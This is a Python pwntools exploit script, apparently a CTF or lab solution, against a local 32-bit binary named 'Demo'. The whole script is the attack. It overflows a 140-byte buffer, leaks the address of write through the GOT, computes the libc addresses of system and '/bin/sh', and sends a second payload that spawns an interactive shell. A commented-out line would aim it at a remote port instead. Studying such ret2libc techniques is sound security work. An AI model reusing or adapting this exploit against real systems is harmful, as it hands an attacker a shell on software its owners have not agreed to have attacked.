#!/usr/bin/env python
import pwn

libc = pwn.ELF('libc.so')
elf_Demo = pwn.ELF('Demo')

attack = pwn.process('./Demo')
# attack = remote('127.0.0.1', 23333)

plt_write = elf_Demo.symbols['write']
print '###### plt_write = ' + hex(plt_write)

got_write = elf_Demo.got['write']
print '###### got_write = ' + hex(got_write)

overflow_addr = 0x08048471
print '###### overflow_addr = ' + hex(overflow_addr)

payload = 140 * 'a'
payload += pwn.p32(plt_write)
payload += pwn.p32(overflow_addr)
payload += pwn.p32(1)
payload += pwn.p32(got_write)
payload += pwn.p32(4)

print "[1] Sending payload"
attack.send(payload)

print "[2] Receiving addr_write"
addr_write = pwn.u32(attack.recv(4))
print 'addr_write = ' + hex(addr_write)

print "[3] Calculating addr_system and addr_binsh"
addr_system = addr_write - (libc.symbols['write'] - libc.symbols['system'])
print 'addr_system = ' + hex(addr_system)
addr_binsh = addr_write - (libc.symbols['write'] - next(libc.search('/bin/sh')))
print 'addr_binsh = ' + hex(addr_binsh)

payload_final = 140 * 'a'
payload_final += pwn.p32(addr_system)
payload_final += pwn.p32(overflow_addr)
payload_final += pwn.p32(addr_binsh)

print "[4] Sending payload_final"
attack.send(payload_final)
attack.interactive()
